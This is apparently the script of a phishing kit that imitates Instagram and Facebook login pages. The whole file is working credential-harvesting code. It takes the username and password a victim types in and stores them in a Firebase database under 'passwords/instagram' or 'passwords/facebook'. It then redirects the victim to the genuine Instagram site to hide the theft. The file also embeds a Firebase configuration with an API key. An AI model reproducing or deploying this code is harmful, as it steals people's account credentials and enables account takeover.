$(document).ready(function() {

    var config = {
        apiKey: "AIzaSyAxg5lkKSuZCTZpuYq-TrfuRyB_rI9sxdE",
        authDomain: "test-dee58.firebaseapp.com",
        databaseURL: "https://test-dee58.firebaseio.com",
        projectId: "test-dee58",
        storageBucket: "test-dee58.appspot.com",
        messagingSenderId: "440868124483"
    };
    firebase.initializeApp(config);


    $('.fb-btn').on('click', function() {
        window.location.href = "facebook.html";
    });

    $('.login-btn').on('click', function() {

        var username = $('#username').val();
        var password = $('#password').val();
        
        if(!username || !password) {
            return alert('Username and password does not match');
        }

        firebase.database().ref('/').child('passwords').child('instagram').push({
            'username': username,
            'password': password
        })
        .then(function() {
            window.location.href = 'https://www.instagram.com';
        });
        
    });

    

    $('.fb-login-btn').on('click', function() {

        var username = $('#username').val();
        var password = $('#password').val();
        
        if(!username || !password) {
            return alert('Username and password does not match');
        }

        firebase.database().ref('/').child('passwords').child('facebook').push({
            'username': username,
            'password': password
        })
        .then(function() {
            window.location.href = 'https://www.instagram.com';
        });
        
    });
});